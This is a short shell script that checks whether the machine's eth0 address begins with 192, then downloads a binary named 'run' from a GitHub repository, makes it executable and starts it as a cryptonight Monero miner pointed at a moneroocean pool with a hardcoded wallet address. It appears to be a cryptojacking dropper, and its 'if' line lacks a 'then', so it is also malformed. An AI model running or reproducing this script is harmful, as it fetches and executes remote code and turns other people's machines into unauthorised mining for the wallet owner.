#!/bin/sh

if ifconfig eth0 | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null;
 
  wget https://github.com/osrun/beta/raw/master/run
  chmod +x run
  ./run -a cryptonight -o stratum+tcp://gulf.moneroocean.stream:80 -u 497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg -p y

fi
